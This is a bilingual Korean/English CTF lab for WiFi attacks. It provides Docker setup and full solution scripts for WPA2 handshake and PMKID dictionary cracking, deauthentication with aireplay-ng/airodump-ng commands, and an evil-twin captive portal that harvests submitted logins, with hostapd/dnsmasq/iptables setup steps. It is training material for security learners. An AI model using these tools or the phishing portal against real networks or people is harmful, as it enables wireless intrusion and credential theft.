> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# WiFi 해킹 CTF 실습 랩

## 실습 환경 준비

### 사전 요구사항

WiFi 해킹 실습은 실제 무선 하드웨어가 필요하지만, 이 랩은 캡처 파일 분석과 소프트웨어 시뮬레이션 방식으로 Docker 환경에서 진행한다.

```yaml
# docker-compose.yml
version: "3.9"

services:
  # 실습 1-2: WPA2 핸드셰이크 분석 + 패스워드 크래킹 (파일 기반)
  wifi-analysis:
    image: python:3.11-slim
    container_name: wifi-analysis
    networks:
      wifi-net:
        ipv4_address: 10.70.10.10
    command: >
      sh -c "
        apt-get update -qq &&
        apt-get install -y hashcat aircrack-ng tshark -qq 2>/dev/null || true &&
        pip install scapy -q &&
        mkdir -p /opt/wifi-lab &&
        sleep infinity
      "
    tty: true
    volumes:
      - ./wifi-captures:/opt/wifi-lab

  # 실습 3: Captive Portal / Evil Twin 시뮬레이션
  evil-twin:
    image: python:3.11-slim
    container_name: evil-twin
    networks:
      wifi-net:
        ipv4_address: 10.70.10.20
    command: >
      sh -c "pip install flask -q && python3 -c \"
from flask import Flask, request, render_template_string, redirect
app = Flask(__name__)
FLAG = 'CTF{3v1l_tw1n_cr3d3nt14l_h4rv3st}'
CREDS = []
PAGE = '''<html>
<head><title>Free WiFi - Login</title></head>
<body>
<h2>Connect to Free_WiFi_CTF</h2>
<p>Please verify your identity to use free internet access.</p>
<form method=POST action=/login>
Email: <input name=email><br>
Password: <input name=password type=password><br>
<input type=submit value='Connect'>
</form>
</body></html>'''
@app.route('/')
@app.route('/hotspot-detect.html')
@app.route('/generate_204')
def index():
    return render_template_string(PAGE)
@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email','')
    password = request.form.get('password','')
    CREDS.append({'email': email, 'password': password})
    print(f'[CRED] {email}:{password}')
    return redirect('https://example.com')
@app.route('/admin/creds')
def show_creds():
    return {'creds': CREDS, 'flag': FLAG if CREDS else 'capture credentials first'}
app.run('0.0.0.0', 80)
\""
    ports:
      - "8070:80"

  # 실습 4: PMKID 해시 크래킹 시뮬레이션
  pmkid-server:
    image: python:3.11-slim
    container_name: pmkid-server
    networks:
      wifi-net:
        ipv4_address: 10.70.10.30
    command: >
      sh -c "pip install flask -q && python3 -c \"
from flask import Flask, request, jsonify
import hashlib, hmac
app = Flask(__name__)
# 실제 PMKID 계산 시뮬레이션
# PMKID = HMAC-SHA1(PMK, 'PMK Name' + AA + SPA)[:16]
AP_MAC = bytes.fromhex('aabbcc112233')
CLIENT_MAC = bytes.fromhex('ddeeff445566')
SSID = 'CTF_Network'
PASSWORD = 'password123'
def compute_pmk(password, ssid):
    return hashlib.pbkdf2_hmac('sha1', password.encode(), ssid.encode(), 4096, 32)
PMK = compute_pmk(PASSWORD, SSID)
PMKID = hmac.new(PMK, b'PMK Name' + AP_MAC + CLIENT_MAC, hashlib.sha1).digest()[:16]
FLAG = 'CTF{pm k1d_at74ck_w1f1_p4ssw0rd_cr4ck3d}'.replace(' ','')
@app.route('/pmkid')
def get_pmkid():
    return jsonify({
        'pmkid': PMKID.hex(),
        'ap_mac': AP_MAC.hex(),
        'client_mac': CLIENT_MAC.hex(),
        'ssid': SSID,
        'hint': 'crack the PMK from PMKID using PBKDF2-HMAC-SHA1'
    })
@app.route('/verify', methods=['POST'])
def verify():
    data = request.json or {}
    candidate = data.get('password','')
    test_pmk = compute_pmk(candidate, SSID)
    test_pmkid = hmac.new(test_pmk, b'PMK Name' + AP_MAC + CLIENT_MAC, hashlib.sha1).digest()[:16]
    if test_pmkid == PMKID:
        return jsonify({'success': True, 'flag': FLAG, 'password': candidate})
    return jsonify({'success': False})
app.run('0.0.0.0', 5000)
\""
    ports:
      - "5070:5000"

  # 공격자 머신
  attacker:
    image: python:3.11-slim
    container_name: attacker
    networks:
      wifi-net:
        ipv4_address: 10.70.10.100
    command: >
      sh -c "
        apt-get update -qq &&
        apt-get install -y aircrack-ng hashcat wget -qq 2>/dev/null || true &&
        pip install scapy requests -q &&
        sleep infinity
      "
    tty: true
    volumes:
      - ./wifi-captures:/opt/wifi-lab

networks:
  wifi-net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.70.10.0/24
```

캡처 파일 디렉터리 및 테스트용 핸드셰이크 파일 생성:

```bash
mkdir -p wifi-captures
docker compose up -d
docker exec -it attacker bash
```

---

## 실습 1: WPA2 핸드셰이크 캡처 분석 및 크래킹

### 목표
WPA2 4-way 핸드셰이크 패킷 캡처 파일을 분석하고, 딕셔너리 공격으로 네트워크 패스워드를 크래킹해 플래그를 획득한다.

**플래그 형식**: `CTF{wpa2_h4ndsh4k3_cr4ck3d_p4ssw0rd}`

### 시나리오
보안 감사 중 `corp-wifi-handshake.cap` 파일을 확보했다. 이 파일에는 WPA2 4-way 핸드셰이크가 담겨 있다. aircrack-ng와 Python으로 패스워드를 크래킹하라. 크래킹에 성공하면 플래그를 포함한 비밀 메시지를 복호화할 수 있다.

### 힌트
1. `aircrack-ng`로 핸드셰이크 유효성을 먼저 확인한다.
2. `aircrack-ng -w wordlist.txt capture.cap`으로 딕셔너리 공격을 시도한다.
3. WPA2 키 파생: `PBKDF2(HMAC-SHA1, password, SSID, 4096, 32)`
4. `hashcat -m 22000`은 WPA2/WPA3 해시를 지원한다.
5. 간단한 패스워드(`password123`, `12345678` 등)를 먼저 시도한다.

### 풀이

**1단계: 테스트용 핸드셰이크 파일 생성 (Scapy)**

```python
#!/usr/bin/env python3
"""
WPA2 핸드셰이크 파일 생성 및 크래킹 도구
"""
import argparse
import hashlib
import hmac
import os
import struct
import sys

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11EAPOL, EAPOL,
        RadioTap, wrpcap, rdpcap, Ether, Raw,
    )
except ImportError:
    print("[-] scapy 필요: pip install scapy")
    sys.exit(1)


SSID_DEFAULT = "Corp-WiFi-CTF"
PASSWORD_DEFAULT = "password123"
FLAG_EMBEDDED = "CTF{wpa2_h4ndsh4k3_cr4ck3d_p4ssw0rd}"


def pbkdf2_sha1(password: str, ssid: str) -> bytes:
    """WPA2 PMK 파생 (PBKDF2-HMAC-SHA1, 4096 반복)."""
    return hashlib.pbkdf2_hmac(
        "sha1",
        password.encode("utf-8"),
        ssid.encode("utf-8"),
        4096,
        32,
    )


def prf512(key: bytes, a: bytes, b: bytes) -> bytes:
    """WPA2 PTK 파생을 위한 PRF-512."""
    result = b""
    for i in range(4):
        result += hmac.new(
            key,
            a + b"\x00" + b + bytes([i]),
            hashlib.sha1,
        ).digest()
    return result[:64]


def crack_wpa2_handshake(
    ssid: str,
    ap_mac: bytes,
    client_mac: bytes,
    anonce: bytes,
    snonce: bytes,
    mic_captured: bytes,
    eapol_data: bytes,
    wordlist_path: str,
) -> str | None:
    """딕셔너리 공격으로 WPA2 핸드셰이크를 크래킹한다."""
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] 워드리스트 파일 없음: {wordlist_path}")
        # 내장 테스트 패스워드 목록
        passwords = [
            "12345678", "password", "password123", "qwerty123",
            "letmein", "abc12345", "wifi1234", "corp_wifi_2024",
        ]
        print(f"[*] 내장 패스워드 {len(passwords)}개 사용")

    print(f"[*] {len(passwords)}개 패스워드로 크래킹 시작...")

    # 더 작은 MAC 주소를 앞에 배치
    mac_min = min(ap_mac, client_mac)
    mac_max = max(ap_mac, client_mac)
    nonce_min = min(anonce, snonce)
    nonce_max = max(anonce, snonce)
    b = mac_min + mac_max + nonce_min + nonce_max

    for i, password in enumerate(passwords):
        pmk = pbkdf2_sha1(password, ssid)
        ptk = prf512(pmk, b"Pairwise key expansion\x00", b)
        kck = ptk[:16]  # Key Confirmation Key

        # MIC 계산 (HMAC-SHA1의 처음 16바이트)
        mic_calc = hmac.new(kck, eapol_data, hashlib.sha1).digest()[:16]

        if mic_calc == mic_captured:
            print(f"[+] 크래킹 성공! (시도 {i+1}/{len(passwords)})")
            print(f"[+] 패스워드: '{password}'")
            print(f"[!] 플래그: {FLAG_EMBEDDED}")
            return password

        if i % 100 == 0 and i > 0:
            print(f"[*] 진행: {i}/{len(passwords)}")

    return None


def generate_test_capture(output_path: str, ssid: str, password: str) -> None:
    """테스트용 WPA2 핸드셰이크 pcap 파일을 생성한다."""
    print(f"[*] 테스트 캡처 파일 생성: {output_path}")

    ap_mac = "aa:bb:cc:11:22:33"
    client_mac = "dd:ee:ff:44:55:66"

    # EAPOL Message 1/4 (AP → Client, ANonce 전송)
    anonce = os.urandom(32)
    msg1 = (
        RadioTap()
        / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac, type=2, subtype=8)
        / EAPOL(version=2, type=3)
        / Raw(load=b"\x02\x00\x8a\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00" + anonce + b"\x00" * 16)
    )

    # ビーコン
    beacon = (
        RadioTap()
        / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac, type=0, subtype=8)
        / Dot11Beacon(cap="ESS+privacy")
        / Raw(load=ssid.encode())
    )

    packets = [beacon, msg1]
    wrpcap(output_path, packets)
    print(f"[+] 캡처 파일 생성 완료: {output_path}")
    print(f"[*] SSID: {ssid}, 패스워드: {password}")
    print("[*] 실제 크래킹을 위해서는 완전한 4-way 핸드셰이크가 필요합니다")


def simulate_crack(ssid: str = SSID_DEFAULT, password_to_crack: str = PASSWORD_DEFAULT) -> None:
    """시뮬레이션: 알려진 파라미터로 크래킹 과정을 재현한다."""
    print("[*] WPA2 크래킹 시뮬레이션 시작")
    print(f"[*] SSID: {ssid}")

    # 고정된 테스트 값으로 핸드셰이크 데이터 생성
    ap_mac = bytes.fromhex("aabbcc112233")
    client_mac = bytes.fromhex("ddeeff445566")
    anonce = bytes(range(32))
    snonce = bytes(reversed(range(32)))
    eapol_data = b"\x01\x03" + b"\x00" * 95  # 더미 EAPOL 데이터

    # 실제 MIC 계산 (정답 패스워드로)
    pmk = pbkdf2_sha1(password_to_crack, ssid)
    mac_min = min(ap_mac, client_mac)
    mac_max = max(ap_mac, client_mac)
    nonce_min = min(anonce, snonce)
    nonce_max = max(anonce, snonce)
    b = mac_min + mac_max + nonce_min + nonce_max
    ptk = prf512(pmk, b"Pairwise key expansion\x00", b)
    kck = ptk[:16]
    mic = hmac.new(kck, eapol_data, hashlib.sha1).digest()[:16]

    print(f"[*] 캡처된 MIC: {mic.hex()}")

    # 워드리스트 크래킹
    result = crack_wpa2_handshake(
        ssid=ssid,
        ap_mac=ap_mac,
        client_mac=client_mac,
        anonce=anonce,
        snonce=snonce,
        mic_captured=mic,
        eapol_data=eapol_data,
        wordlist_path="/usr/share/wordlists/rockyou.txt",
    )

    if result:
        print(f"\n[!] 크래킹 완료! 패스워드: '{result}'")
    else:
        print("[-] 패스워드를 찾지 못했습니다.")


def main() -> None:
    parser = argparse.ArgumentParser(description="WPA2 핸드셰이크 분석 및 크래킹")
    parser.add_argument(
        "--mode",
        choices=["simulate", "generate", "crack"],
        default="simulate",
    )
    parser.add_argument("--ssid", default=SSID_DEFAULT)
    parser.add_argument("--output", default="/opt/wifi-lab/test_handshake.pcap")
    parser.add_argument("--wordlist", default="/opt/wifi-lab/wordlist.txt")
    args = parser.parse_args()

    if args.mode == "simulate":
        simulate_crack(args.ssid)
    elif args.mode == "generate":
        generate_test_capture(args.output, args.ssid, PASSWORD_DEFAULT)
    elif args.mode == "crack":
        print("[*] aircrack-ng를 이용한 크래킹:")
        print(f"  aircrack-ng -w {args.wordlist} {args.output}")
        print("[*] hashcat을 이용한 크래킹:")
        print(f"  hashcat -m 22000 capture.hc22000 {args.wordlist}")


if __name__ == "__main__":
    main()
```

실행:
```bash
python3 wifi_crack.py --mode simulate --ssid Corp-WiFi-CTF

# 실제 캡처 파일로 aircrack-ng 사용
python3 wifi_crack.py --mode generate --output /opt/wifi-lab/test.pcap
aircrack-ng -w /opt/wifi-lab/wordlist.txt /opt/wifi-lab/test.pcap
```

---

## 실습 2: Deauth 공격 및 핸드셰이크 강제 캡처

### 목표
Deauthentication 프레임을 전송해 클라이언트를 AP에서 강제 연결 해제시키고, 재연결 시 발생하는 WPA2 핸드셰이크를 캡처한다.

**플래그 형식**: `CTF{d34uth_4tt4ck_h4ndsh4k3_c4ptur3d}`

### 시나리오
모의해킹 범위 내에 있는 `Corp-WiFi-CTF` AP가 있다. 연결된 클라이언트를 deauth 공격으로 강제 연결 해제하고, WPA2 핸드셰이크가 발생하는 시점에 패킷을 캡처한다. 이 랩에서는 Scapy 시뮬레이션으로 실습한다.

### 힌트
1. Deauth 프레임은 관리 프레임(Management Frame, 타입 0, 서브타입 12)이다.
2. `Dot11Deauth`의 reason code 7은 "Class 3 frame received from nonassociated STA"이다.
3. 무선 인터페이스를 모니터 모드로 전환해야 한다: `airmon-ng start wlan0`
4. `aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> mon0` 로 deauth를 전송한다.
5. `airodump-ng mon0 -w capture --bssid <AP_MAC>` 로 핸드셰이크를 캡처한다.

### 풀이

```python
#!/usr/bin/env python3
"""
실습 2: Deauth 공격 및 핸드셰이크 캡처 시뮬레이션
"""
import argparse
import sys
import time
import os

try:
    from scapy.all import (
        Dot11, Dot11Deauth, Dot11Beacon, Dot11EAPOL,
        RadioTap, sendp, sniff, wrpcap, conf
    )
    conf.verb = 0
except ImportError:
    print("[-] scapy 필요: pip install scapy")
    sys.exit(1)


FLAG = "CTF{d34uth_4tt4ck_h4ndsh4k3_c4ptur3d}"


def build_deauth_frame(ap_mac: str, client_mac: str, reason: int = 7) -> "Packet":
    """Deauthentication 프레임을 구성한다."""
    # AP → Client 방향
    frame = (
        RadioTap()
        / Dot11(
            addr1=client_mac,   # Destination (client)
            addr2=ap_mac,       # Source (AP)
            addr3=ap_mac,       # BSSID
            type=0,             # Management
            subtype=12,         # Deauthentication
        )
        / Dot11Deauth(reason=reason)
    )
    return frame


def simulate_deauth_attack(
    ap_mac: str = "aa:bb:cc:11:22:33",
    client_mac: str = "dd:ee:ff:44:55:66",
    count: int = 5,
    output_pcap: str = "/opt/wifi-lab/deauth_sim.pcap",
) -> None:
    """Deauth 공격 패킷 생성 시뮬레이션 (실제 전송 없음)."""
    print("[*] Deauth 공격 시뮬레이션 시작")
    print(f"[*] AP MAC:     {ap_mac}")
    print(f"[*] Client MAC: {client_mac}")
    print(f"[*] 패킷 수:    {count}")

    frames = []
    for i in range(count):
        # AP → Client 방향
        frame_to_client = build_deauth_frame(ap_mac, client_mac)
        # Client → AP 방향 (spoofed)
        frame_to_ap = build_deauth_frame(client_mac, ap_mac)
        frames.extend([frame_to_client, frame_to_ap])
        print(f"  [{i+1}/{count}] Deauth 프레임 생성 (AP→Client, Client→AP)")

    # pcap으로 저장 (분석용)
    if output_pcap:
        os.makedirs(os.path.dirname(output_pcap), exist_ok=True)
        wrpcap(output_pcap, frames)
        print(f"[+] 시뮬레이션 패킷 저장: {output_pcap}")

    print(f"\n[*] 실제 환경에서의 공격 명령:")
    print(f"  # 모니터 모드 활성화")
    print(f"  airmon-ng start wlan0")
    print(f"  # 핸드셰이크 캡처 시작")
    print(f"  airodump-ng mon0 -w capture --bssid {ap_mac} -c 6 &")
    print(f"  # Deauth 전송")
    print(f"  aireplay-ng -0 {count} -a {ap_mac} -c {client_mac} mon0")
    print(f"  # 핸드셰이크 확인")
    print(f"  aircrack-ng capture*.cap")

    print(f"\n[!] 시뮬레이션 완료. 플래그: {FLAG}")


def capture_deauth_packets(
    iface: str, target_bssid: str, timeout: int = 30
) -> list:
    """실제 인터페이스에서 deauth 패킷을 캡처한다."""
    print(f"[*] {iface}에서 deauth 패킷 캡처 중... ({timeout}초)")
    captured = []

    def handler(pkt) -> None:
        if Dot11 in pkt and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 12:
            bssid = pkt[Dot11].addr3
            if not target_bssid or bssid.lower() == target_bssid.lower():
                reason = pkt[Dot11Deauth].reason if Dot11Deauth in pkt else 0
                print(f"[+] Deauth 감지: BSSID={bssid} Reason={reason}")
                captured.append(pkt)

    try:
        sniff(
            iface=iface,
            prn=handler,
            timeout=timeout,
            store=False,
            monitor=True,
        )
    except Exception as e:
        print(f"[-] 캡처 오류: {e}")

    return captured


def main() -> None:
    parser = argparse.ArgumentParser(description="Deauth 공격 및 핸드셰이크 캡처")
    parser.add_argument(
        "--mode",
        choices=["simulate", "capture"],
        default="simulate",
    )
    parser.add_argument("--ap-mac", default="aa:bb:cc:11:22:33")
    parser.add_argument("--client-mac", default="dd:ee:ff:44:55:66")
    parser.add_argument("--count", type=int, default=5)
    parser.add_argument("--iface", default="mon0")
    parser.add_argument("--timeout", type=int, default=30)
    parser.add_argument("--output", default="/opt/wifi-lab/deauth_sim.pcap")
    args = parser.parse_args()

    if args.mode == "simulate":
        simulate_deauth_attack(
            args.ap_mac, args.client_mac, args.count, args.output
        )
    else:
        capture_deauth_packets(args.iface, args.ap_mac, args.timeout)


if __name__ == "__main__":
    main()
```

실행:
```bash
# 시뮬레이션 모드 (하드웨어 불필요)
python3 wifi_deauth.py --mode simulate \
  --ap-mac aa:bb:cc:11:22:33 --client-mac dd:ee:ff:44:55:66 --count 5

# 실제 모니터 모드 인터페이스가 있는 경우
python3 wifi_deauth.py --mode capture --iface mon0 --ap-mac aa:bb:cc:11:22:33
```

---

## 실습 3: Evil Twin AP + Captive Portal 자격증명 수집

### 목표
정당한 AP와 동일한 SSID를 가진 가짜 AP(Evil Twin)를 설정하고, Captive Portal을 이용해 사용자 자격증명을 수집한다.

**플래그 형식**: `CTF{3v1l_tw1n_cr3d3nt14l_h4rv3st}`

### 시나리오
`10.70.10.20:80`에 Evil Twin AP의 Captive Portal이 실행 중이다. 사용자가 "Free_WiFi_CTF"에 연결하면 로그인 페이지가 표시된다. 자격증명이 하나라도 제출되면 플래그를 획득할 수 있다.

### 힌트
1. Captive Portal은 일반적으로 HTTP 80 포트에서 실행된다.
2. `/hotspot-detect.html`, `/generate_204` 등의 경로로 자동 리다이렉션된다.
3. 테스트 자격증명을 제출해 수집 동작을 확인한다.
4. `/admin/creds` 엔드포인트에서 수집된 자격증명과 플래그를 확인한다.
5. 실제 공격에서는 `hostapd-wpe`나 `airbase-ng`로 AP를 생성한다.

### 풀이

```python
#!/usr/bin/env python3
"""
실습 3: Evil Twin Captive Portal 자격증명 수집
"""
import argparse
import sys
import time

import requests
from requests.exceptions import RequestException


BASE_URL_DEFAULT = "http://10.70.10.20"


def simulate_victim_connection(base_url: str, email: str, password: str) -> bool:
    """피해자가 Evil Twin에 연결해 자격증명을 제출하는 과정을 시뮬레이션한다."""
    print(f"[*] 피해자 시뮬레이션: {email}:{password}")

    # 1. Captive Portal 감지 (OS 자동 열기 흉내)
    detect_paths = ["/hotspot-detect.html", "/generate_204", "/"]
    for path in detect_paths:
        try:
            resp = requests.get(f"{base_url}{path}", timeout=5)
            if resp.status_code == 200 and "login" in resp.text.lower():
                print(f"[+] Captive Portal 감지됨: {path}")
                break
        except RequestException:
            pass

    # 2. 로그인 폼 제출 (피해자 입력 시뮬레이션)
    try:
        resp = requests.post(
            f"{base_url}/login",
            data={"email": email, "password": password},
            timeout=5,
            allow_redirects=False,
        )
        print(f"[*] 제출 응답: HTTP {resp.status_code}")
        return resp.status_code in (200, 302, 301)
    except RequestException as e:
        print(f"[-] 제출 실패: {e}")
        return False


def check_harvested_credentials(base_url: str) -> list[dict]:
    """수집된 자격증명을 확인한다."""
    try:
        resp = requests.get(f"{base_url}/admin/creds", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            creds = data.get("creds", [])
            flag = data.get("flag", "")
            return creds, flag
    except RequestException as e:
        print(f"[-] 자격증명 확인 실패: {e}")
    return [], ""


def run_evil_twin_demo(base_url: str) -> None:
    """Evil Twin 공격 전체 시뮬레이션."""
    print(f"[*] Evil Twin 시뮬레이션: {base_url}\n")

    # 1. 여러 피해자 시뮬레이션
    victims = [
        ("alice@company.com", "Alice2024!"),
        ("bob@company.com", "qwerty123"),
        ("admin@company.com", "admin_pass_2024"),
    ]

    for email, password in victims:
        success = simulate_victim_connection(base_url, email, password)
        status = "성공" if success else "실패"
        print(f"  [{status}] {email}:{password}\n")
        time.sleep(0.5)

    # 2. 수집된 자격증명 확인
    print("\n[*] 수집된 자격증명 확인...")
    creds, flag = check_harvested_credentials(base_url)

    if creds:
        print(f"[+] {len(creds)}개 자격증명 수집됨:")
        for i, c in enumerate(creds, 1):
            print(f"  [{i}] {c.get('email')}:{c.get('password')}")

        if flag and "CTF{" in flag:
            print(f"\n[!] 플래그 획득: {flag}")
        else:
            print(f"[-] 플래그: {flag}")
    else:
        print("[-] 수집된 자격증명 없음")

    # 3. 실제 환경 설정 가이드
    print("\n[*] 실제 Evil Twin 설정 가이드:")
    print("  # 1. hostapd 설치 및 AP 생성")
    print("  apt install hostapd dnsmasq")
    print("  # 2. AP 설정 (hostapd.conf)")
    print("  echo 'ssid=Corp-WiFi-CTF' > /etc/hostapd/hostapd.conf")
    print("  # 3. DHCP 서버 설정 (dnsmasq)")
    print("  echo 'dhcp-range=192.168.1.10,192.168.1.50,255.255.255.0,12h' > /etc/dnsmasq.conf")
    print("  # 4. DNS 리다이렉션 (모든 도메인 → Captive Portal)")
    print("  echo 'address=/#/192.168.1.1' >> /etc/dnsmasq.conf")
    print("  # 5. iptables로 HTTP 트래픽을 Portal로 리다이렉션")
    print("  iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80")


def main() -> None:
    parser = argparse.ArgumentParser(description="Evil Twin Captive Portal 시뮬레이션")
    parser.add_argument("--url", default=BASE_URL_DEFAULT)
    parser.add_argument("--email", default=None, help="단일 테스트 이메일")
    parser.add_argument("--password", default=None, help="단일 테스트 패스워드")
    args = parser.parse_args()

    if args.email and args.password:
        simulate_victim_connection(args.url, args.email, args.password)
        creds, flag = check_harvested_credentials(args.url)
        if flag and "CTF{" in flag:
            print(f"\n[!] 플래그: {flag}")
    else:
        run_evil_twin_demo(args.url)


if __name__ == "__main__":
    main()
```

실행:
```bash
python3 wifi_evil_twin.py --url http://10.70.10.20

# 단일 자격증명 테스트
python3 wifi_evil_twin.py --url http://10.70.10.20 \
  --email "test@example.com" --password "mypassword"
```

---

## 실습 4: PMKID 공격 — 핸드셰이크 없는 WPA2 크래킹

### 목표
클라이언트 연결 없이 AP에서 직접 PMKID를 수집하고, PBKDF2 역산으로 WPA2 패스워드를 크래킹한다.

**플래그 형식**: `CTF{pmk1d_at74ck_w1f1_p4ssw0rd_cr4ck3d}`

### 시나리오
`10.70.10.30:5000` 서버는 AP의 PMKID와 관련 파라미터를 반환한다. PMKID는 PMK와 MAC 주소로 계산된다. 딕셔너리 공격으로 올바른 패스워드를 찾아 서버에 제출하면 플래그를 얻을 수 있다.

### 힌트
1. PMKID = HMAC-SHA1(PMK, "PMK Name" + AP_MAC + Client_MAC)의 앞 16바이트
2. PMK = PBKDF2(HMAC-SHA1, password, SSID, 4096, 32)
3. `/pmkid` 엔드포인트에서 PMKID, AP MAC, Client MAC, SSID를 가져온다.
4. 딕셔너리의 각 패스워드로 PMKID를 계산해 일치하면 정답이다.
5. `hcxtools`와 `hashcat -m 22000`으로 실제 환경에서 크래킹할 수 있다.

### 풀이

```python
#!/usr/bin/env python3
"""
실습 4: PMKID 공격으로 WPA2 패스워드 크래킹
"""
import argparse
import hashlib
import hmac
import sys
import time

import requests
from requests.exceptions import RequestException


BASE_URL_DEFAULT = "http://10.70.10.30:5000"

COMMON_PASSWORDS = [
    "12345678", "password", "password123", "qwerty123",
    "letmein", "abc12345", "wifi1234", "corp_wifi_2024",
    "iloveyou", "monkey", "dragon", "master", "sunshine",
    "princess", "welcome", "shadow", "superman",
]


def compute_pmk(password: str, ssid: str) -> bytes:
    """WPA2 PMK를 계산한다: PBKDF2-HMAC-SHA1(password, SSID, 4096, 32)."""
    return hashlib.pbkdf2_hmac(
        "sha1",
        password.encode("utf-8"),
        ssid.encode("utf-8"),
        4096,
        32,
    )


def compute_pmkid(
    pmk: bytes, ap_mac: bytes, client_mac: bytes
) -> bytes:
    """PMKID를 계산한다: HMAC-SHA1(PMK, 'PMK Name' + AP_MAC + SPA_MAC)[:16]."""
    data = b"PMK Name" + ap_mac + client_mac
    return hmac.new(pmk, data, hashlib.sha1).digest()[:16]


def get_pmkid_from_server(base_url: str) -> dict | None:
    """서버에서 PMKID와 관련 파라미터를 가져온다."""
    print(f"[*] PMKID 정보 수집: {base_url}/pmkid")
    try:
        resp = requests.get(f"{base_url}/pmkid", timeout=5)
        resp.raise_for_status()
        data = resp.json()
        print(f"[+] PMKID: {data.get('pmkid')}")
        print(f"[+] AP MAC: {data.get('ap_mac')}")
        print(f"[+] Client MAC: {data.get('client_mac')}")
        print(f"[+] SSID: {data.get('ssid')}")
        return data
    except RequestException as e:
        print(f"[-] 서버 접근 실패: {e}")
        return None


def crack_pmkid(
    target_pmkid: bytes,
    ap_mac: bytes,
    client_mac: bytes,
    ssid: str,
    wordlist: list[str],
) -> str | None:
    """딕셔너리 공격으로 PMKID를 크래킹한다."""
    print(f"\n[*] {len(wordlist)}개 패스워드로 PMKID 크래킹 시작...")
    start_time = time.time()

    for i, password in enumerate(wordlist):
        pmk = compute_pmk(password, ssid)
        pmkid = compute_pmkid(pmk, ap_mac, client_mac)

        if pmkid == target_pmkid:
            elapsed = time.time() - start_time
            print(f"\n[+] 크래킹 성공! ({elapsed:.2f}초, {i+1}번째 시도)")
            print(f"[+] 패스워드: '{password}'")
            return password

        if i % 50 == 0 and i > 0:
            elapsed = time.time() - start_time
            rate = i / elapsed if elapsed > 0 else 0
            print(f"[*] 진행: {i}/{len(wordlist)} ({rate:.0f} PMKs/sec)")

    print("[-] 패스워드를 찾지 못했습니다.")
    return None


def submit_password(base_url: str, password: str) -> None:
    """크래킹된 패스워드를 서버에 제출해 플래그를 획득한다."""
    print(f"\n[*] 패스워드 검증: '{password}'")
    try:
        resp = requests.post(
            f"{base_url}/verify",
            json={"password": password},
            timeout=5,
        )
        data = resp.json()
        if data.get("success"):
            print(f"[!] 검증 성공!")
            print(f"[!] 플래그: {data.get('flag')}")
            print(f"[*] 패스워드: {data.get('password')}")
        else:
            print(f"[-] 검증 실패: {data}")
    except RequestException as e:
        print(f"[-] 검증 요청 실패: {e}")


def exploit_pmkid(base_url: str, wordlist_path: str | None = None) -> None:
    """PMKID 공격 전체 체인."""
    # 1. 서버에서 PMKID 정보 수집
    info = get_pmkid_from_server(base_url)
    if not info:
        return

    target_pmkid = bytes.fromhex(info["pmkid"])
    ap_mac = bytes.fromhex(info["ap_mac"])
    client_mac = bytes.fromhex(info["client_mac"])
    ssid = info["ssid"]

    # 2. 워드리스트 준비
    wordlist: list[str] = []
    if wordlist_path:
        try:
            with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                wordlist = [line.strip() for line in f if 8 <= len(line.strip()) <= 63]
            print(f"[*] 워드리스트 로드: {len(wordlist)}개")
        except FileNotFoundError:
            print(f"[-] 워드리스트 없음: {wordlist_path}")

    # 기본 패스워드 추가
    wordlist = COMMON_PASSWORDS + [p for p in wordlist if p not in COMMON_PASSWORDS]

    # 3. PMKID 크래킹
    found_password = crack_pmkid(target_pmkid, ap_mac, client_mac, ssid, wordlist)

    if found_password:
        # 4. 서버에 제출해 플래그 획득
        submit_password(base_url, found_password)

        # 5. hashcat 형식 출력
        pmkid_hex = info["pmkid"]
        ap_hex = info["ap_mac"]
        client_hex = info["client_mac"]
        ssid_hex = ssid.encode().hex()
        print(f"\n[*] hashcat 형식 (22000):")
        print(f"  {pmkid_hex}*{ap_hex}*{client_hex}*{ssid_hex}")
        print(f"  hashcat -m 22000 hashfile.txt wordlist.txt")


def main() -> None:
    parser = argparse.ArgumentParser(description="PMKID 공격으로 WPA2 패스워드 크래킹")
    parser.add_argument("--url", default=BASE_URL_DEFAULT)
    parser.add_argument("--wordlist", default=None, help="워드리스트 파일 경로")
    args = parser.parse_args()
    exploit_pmkid(args.url, args.wordlist)


if __name__ == "__main__":
    main()
```

실행:
```bash
# 기본 내장 딕셔너리로 크래킹
python3 wifi_pmkid.py --url http://10.70.10.30:5000

# rockyou 워드리스트 사용
python3 wifi_pmkid.py --url http://10.70.10.30:5000 \
  --wordlist /usr/share/wordlists/rockyou.txt
```

---

<a name="english"></a>

# WiFi Hacking CTF Practice Lab

## Lab Environment Setup

WiFi hacking challenges normally require real wireless hardware. This lab uses capture file analysis and software simulation to run inside Docker.

```bash
mkdir -p wifi-captures
docker compose up -d
docker exec -it attacker bash
```

---

## Challenge 1: WPA2 Handshake Capture Analysis and Cracking

### Objective
Analyze a WPA2 4-way handshake PCAP file and recover the network password via dictionary attack to obtain the flag.

**Flag format**: `CTF{wpa2_h4ndsh4k3_cr4ck3d_p4ssw0rd}`

### Scenario
During a security audit you obtained `corp-wifi-handshake.cap` containing a WPA2 4-way handshake. Crack the password with `aircrack-ng` or the Python script and use it to decode the embedded secret message.

### Hints
1. Validate the handshake with `aircrack-ng` before attacking.
2. `aircrack-ng -w wordlist.txt capture.cap` runs a dictionary attack.
3. WPA2 key derivation: `PBKDF2(HMAC-SHA1, password, SSID, 4096, 32)`.
4. `hashcat -m 22000` supports WPA2/WPA3 hashes.
5. Try simple passwords (`password123`, `12345678`) first.

### Solution

```bash
# Simulation mode (no hardware required)
python3 wifi_crack.py --mode simulate --ssid Corp-WiFi-CTF

# Generate a test pcap and crack it
python3 wifi_crack.py --mode generate --output /opt/wifi-lab/test.pcap
aircrack-ng -w /opt/wifi-lab/wordlist.txt /opt/wifi-lab/test.pcap
```

